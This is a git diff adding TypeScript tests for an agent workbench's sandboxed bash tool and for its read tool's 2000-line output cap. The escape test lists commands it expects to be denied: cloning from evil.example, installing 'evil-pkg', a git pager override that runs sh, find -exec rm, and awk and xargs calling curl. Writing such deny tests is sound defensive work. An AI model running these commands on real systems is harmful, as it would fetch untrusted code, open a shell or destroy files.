@@ -128,3 +128,35 @@ test("git diff 语义：workspace 内改动可见（供 patch 工件）", async 
 	const status = await byName.bash.execute("t4", { argv: ["git", "status", "--porcelain"] }, undefined, undefined, {} as never);
 	assert.match((status.content[0] as { text: string }).text, /a\.txt/);
 });
+
+test("bash 逃逸面：xargs/npx/git 网络子命令/find -exec 拒绝", async () => {
+	const { byName } = await makeWorkbench();
+	for (const argv of [
+		["xargs", "curl"],
+		["npx", "cowsay"],
+		["git", "push", "origin", "main"],
+		["git", "clone", "https://evil.example/x"],
+		["git", "-c", "core.pager=sh", "diff"],
+		["find", ".", "-exec", "rm", "{}", ";"],
+		["npm", "install", "evil-pkg"],
+		["awk", "BEGIN{system(\"curl x\")}"],
+	]) {
+		const denied = await byName.bash.execute("t9", { argv }, undefined, undefined, {} as never);
+		assert.ok(denied.isError, `${argv.join(" ")} 未被拒绝`);
+	}
+	// 合法 git 本地操作仍可用。
+	await byName.bash.execute("t9i", { argv: ["git", "init", "-q"] }, undefined, undefined, {} as never);
+	const ok = await byName.bash.execute("t10", { argv: ["git", "status", "--porcelain"] }, undefined, undefined, {} as never);
+	assert.ok(!deniedOrError(ok));
+	function deniedOrError(r: { isError?: boolean }) { return r.isError === true; }
+});
+
+test("read 默认 2000 行上限（大日志不整本进上下文）", async () => {
+	const { ws, byName } = await makeWorkbench();
+	const big = Array.from({ length: 5000 }, (_, i) => `line ${i}`).join("\n");
+	writeFileSync(join(ws, "big.log"), big);
+	const result = await byName.read.execute("t1", { path: "big.log" }, undefined, undefined, {} as never);
+	const text = (result.content[0] as { text: string }).text;
+	assert.match(text, /line 1999/);
+	assert.ok(!text.includes("line 2000"), "默认上限未生效");
+});
